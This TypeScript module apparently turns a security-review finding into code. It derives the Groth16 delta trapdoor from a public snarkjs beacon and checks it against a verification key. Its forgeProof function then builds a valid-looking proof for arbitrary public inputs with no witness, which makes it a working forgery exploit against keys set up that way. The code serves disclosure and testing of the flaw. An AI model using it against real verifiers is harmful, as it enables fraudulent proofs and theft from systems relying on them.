import { createHash } from "node:crypto";
import { getCurveFromName, ChaCha, type Curve, type FieldElement } from "ffjavascript";
import type { Groth16Proof, PublicSignals } from "snarkjs";

/**
 * Review finding 9.3, made executable: a Groth16 key whose only phase-2
 * contribution is a PUBLIC beacon has a public trapdoor.
 *
 * snarkjs' newZKey starts from delta = 1 (the generators) and zkey beacon
 * multiplies delta by Fr.fromRng(ChaCha(seed)), where the seed is
 * SHA-256^(2^iterExp)(beaconHash). With gamma also fixed at the G2 generator,
 * knowing d = dlog(delta) lets anyone build a verifying proof for ANY public
 * inputs x without a witness:
 *   A = alpha, B = beta, C = -d^{-1} * IC(x)
 *   e(A,B) = e(alpha,beta) * e(IC(x), gamma) * e(C, delta)   holds because
 *   e(C, delta) = e(-d^{-1} IC(x), d G2) = e(IC(x), G2)^{-1}.
 *
 * `deriveBeaconTrapdoor` recomputes d from the beacon parameters and reports
 * whether it matches the key's delta (it does for v2's setup; it does not for
 * v3's, which adds a secret contribution before the beacon).
 */
interface VerificationKey {
  vk_alpha_1: string[];
  vk_beta_2: string[][];
  vk_gamma_2: string[][];
  vk_delta_2: string[][];
  IC: string[][];
}

let curvePromise: Promise<Curve> | null = null;
function bn128(): Promise<Curve> {
  curvePromise ??= getCurveFromName("bn128");
  return curvePromise;
}

const g1 = (c: Curve, p: string[]) => c.G1.fromObject(p.map((v) => BigInt(v)));
const g2 = (c: Curve, p: string[][]) => c.G2.fromObject(p.map((q) => q.map((v) => BigInt(v))));

export interface TrapdoorResult {
  /** d = Fr.fromRng(ChaCha(SHA-256^(2^iterExp)(beaconHash))), as snarkjs derives it. */
  d: FieldElement;
  /** d * G2 == vk_delta_2: the key's delta is fully determined by public data. */
  matchesDelta: boolean;
  /** vk_gamma_2 is the G2 generator (always true for snarkjs keys). */
  gammaIsGenerator: boolean;
}

export async function deriveBeaconTrapdoor(
  vk: VerificationKey,
  beaconHashHex: string,
  iterExp: number
): Promise<TrapdoorResult> {
  const curve = await bn128();
  let h: Buffer = Buffer.from(beaconHashHex, "hex");
  for (let i = 0; i < 2 ** iterExp; i++) h = createHash("sha256").update(h).digest();
  const seed: number[] = [];
  for (let i = 0; i < 8; i++) seed.push(h.readUInt32BE(i * 4));
  const d = curve.Fr.fromRng(new ChaCha(seed));
  return {
    d,
    matchesDelta: curve.G2.eq(curve.G2.timesFr(curve.G2.g, d), g2(curve, vk.vk_delta_2)),
    gammaIsGenerator: curve.G2.eq(g2(curve, vk.vk_gamma_2), curve.G2.g),
  };
}

/** Build (A, B, C) = (alpha, beta, -d^{-1} IC(x)) for the given public signals. */
export async function forgeProof(
  vk: VerificationKey,
  d: FieldElement,
  publicSignals: PublicSignals
): Promise<Groth16Proof> {
  const curve = await bn128();
  if (publicSignals.length !== vk.IC.length - 1) {
    throw new Error(`key expects ${vk.IC.length - 1} public signals, got ${publicSignals.length}`);
  }
  let ic = g1(curve, vk.IC[0] as string[]);
  publicSignals.forEach((x, i) => {
    ic = curve.G1.add(ic, curve.G1.timesFr(g1(curve, vk.IC[i + 1] as string[]), curve.Fr.e(x)));
  });
  const c = curve.G1.neg(curve.G1.timesFr(ic, curve.Fr.inv(d)));
  const out1 = (p: Uint8Array) =>
    curve.G1.toObject(curve.G1.toAffine(p)).map((v) => v.toString());
  const out2 = (p: Uint8Array) =>
    curve.G2.toObject(curve.G2.toAffine(p)).map((q) => q.map((v) => v.toString()));
  return {
    pi_a: out1(g1(curve, vk.vk_alpha_1)) as Groth16Proof["pi_a"],
    pi_b: out2(g2(curve, vk.vk_beta_2)) as Groth16Proof["pi_b"],
    pi_c: out1(c) as Groth16Proof["pi_c"],
    protocol: "groth16",
    curve: "bn128",
  };
}
